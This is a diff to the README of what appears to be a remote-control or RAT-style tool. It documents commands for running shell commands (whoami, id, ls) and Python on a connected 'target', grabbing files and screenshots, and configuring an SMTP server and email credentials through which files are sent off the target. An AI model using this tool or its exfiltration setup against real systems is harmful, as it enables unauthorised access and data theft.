@@ -63,35 +63,35 @@ After connecting to the target, you can operate the target with the following co
 
 ````
 1. shell [Command] #Execute shell command
-2. get [Path] #Get the file
-3. win #Get the current screenshot
-4. py [Code] #Execute python code
+2. getfile [Path] #Get the file
+3. pycmd [Code] #Execute python code
 ````
 
 E.g.
 ````
 1. shell whoami #Execute whoami command
-    shell id
-    shell ls
-2. get a.txt #Get a.txt
-    get /a.jpg #Get a.jpg in the root directory
+   shell id
+   shell ls
+2. getfile a.txt #Get a.txt
+   getfile /a.jpg #Get a.jpg in the root directory
 3. win #Get the current screenshot
-4. py print('hello world') #output hello world
-    py import os; print(os.name)
+4. pycmd print('hello world') #output hello world
+   pycmd import os; print(os.name)
 ````
 
 ### Attention!
 Because shell commands are not interactive shells you cannot execute commands like "vim" and "sudo"!
 
-The "get" and "win" commands use the smtp protocol to transfer files. You must do the following before using these two commands!!!
+The "getfile" command use the smtp protocol to transfer files. You must do the following before using these command!!!
 
 ````
-$> py host = "smtp server domain name" #For example, NetEase mailbox is smtp.163.com
-命令执行成功
-$> py port = "smtp service port" #usually port 25
-命令执行成功
-$> py username = "your email"
-命令执行成功
-$> py password = "The password provided to you by the smtp service operator"
-命令执行成功
+$> pycmd host = "smtp server domain name" #For example, NetEase mailbox is smtp.163.com
+YES
+$> pycmd port = "smtp service port" #usually port 25
+YES
+$> pycmd username = "your email"
+YES
+$> pycmd password = "The password provided to you by the smtp service operator"
+YES
+$>...
 ````
